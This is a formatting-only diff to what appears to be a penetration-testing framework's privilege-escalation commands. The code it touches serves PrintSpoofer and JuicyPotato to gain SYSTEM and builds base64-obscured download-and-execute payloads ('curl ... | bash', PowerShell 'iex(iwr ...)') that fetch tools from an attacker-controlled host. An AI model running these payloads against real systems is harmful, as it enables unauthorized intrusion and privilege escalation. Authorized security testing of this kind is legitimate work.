@@ -531,6 +531,7 @@ class PrivilegeEscalationCommandSet(LazyOwnCommandSet):
             if os.path.isfile(session_csv):
                 try:
                     import csv
+
                     with open(session_csv, encoding="utf-8", errors="ignore") as handle:
                         for row in csv.DictReader(handle):
                             out = row.get("output", "")
@@ -543,8 +544,9 @@ class PrivilegeEscalationCommandSet(LazyOwnCommandSet):
             print_msg("First run 'sudo -l' on the target and save the output to a file.")
             print_msg("Or pass output via a session file.")
             return
-        import re
         import os as _os
+        import re
+
         sudo_binaries: list[str] = []
         patterns = [
             r"\(\S+\)\s+NOPASSWD:\s*(\S+)",
@@ -613,9 +615,12 @@ class PrivilegeEscalationCommandSet(LazyOwnCommandSet):
             None.
         """
         del line
-        return self._serve_windows_tool("PrintSpoofer64.exe", "PrintSpoofer",
-                                        "Impersonate SYSTEM via SeImpersonatePrivilege",
-                                        "\\\\localhost\\pipe\\spoolss")
+        return self._serve_windows_tool(
+            "PrintSpoofer64.exe",
+            "PrintSpoofer",
+            "Impersonate SYSTEM via SeImpersonatePrivilege",
+            "\\\\localhost\\pipe\\spoolss",
+        )
 
     @cmd2.with_category(privilege_escalation_category)
     def do_juicypotato(self, line):
@@ -635,9 +640,12 @@ class PrivilegeEscalationCommandSet(LazyOwnCommandSet):
         clsid = (line or "").strip()
         default_clsid = "{4991d34b-80a1-4291-83b6-3328366b9097}"
         use_clsid = clsid if clsid and clsid.startswith("{") else default_clsid
-        self._serve_windows_tool("JuicyPotato.exe", "JuicyPotato",
-                                  "Impersonate SYSTEM via SeImpersonatePrivilege (potato)",
-                                  f" -t * -p C:\\\\Windows\\\\System32\\\\cmd.exe -l 1337 -c {use_clsid}")
+        self._serve_windows_tool(
+            "JuicyPotato.exe",
+            "JuicyPotato",
+            "Impersonate SYSTEM via SeImpersonatePrivilege (potato)",
+            f" -t * -p C:\\\\Windows\\\\System32\\\\cmd.exe -l 1337 -c {use_clsid}",
+        )
 
     def _serve_windows_tool(self, binary: str, label: str, description: str, args: str) -> None:
         """Serve a Windows privilege escalation binary over HTTP.
@@ -774,10 +782,7 @@ class PrivilegeEscalationCommandSet(LazyOwnCommandSet):
             payload = f"curl -s http://{lhost}:{lport}/{fname} | bash"
         else:
             variant = WINPEAS_VARIANTS.get("ps1", "winPEAS.ps1")
-            payload = (
-                f"iex(iwr -Uri 'http://{lhost}:{lport}/{variant}' "
-                f"-UseBasicParsing).Content"
-            )
+            payload = f"iex(iwr -Uri 'http://{lhost}:{lport}/{variant}' -UseBasicParsing).Content"
 
         b64_payload = base64.b64encode(payload.encode()).decode()
 
@@ -785,7 +790,7 @@ class PrivilegeEscalationCommandSet(LazyOwnCommandSet):
             final_cmd = f"echo '{b64_payload}' | base64 -d | bash"
         else:
             final_cmd = (
-                f"powershell -c \"[System.Text.Encoding]::UTF8.GetString("
+                f'powershell -c "[System.Text.Encoding]::UTF8.GetString('
                 f"[System.Convert]::FromBase64String('{b64_payload}')) | iex\""
             )
 
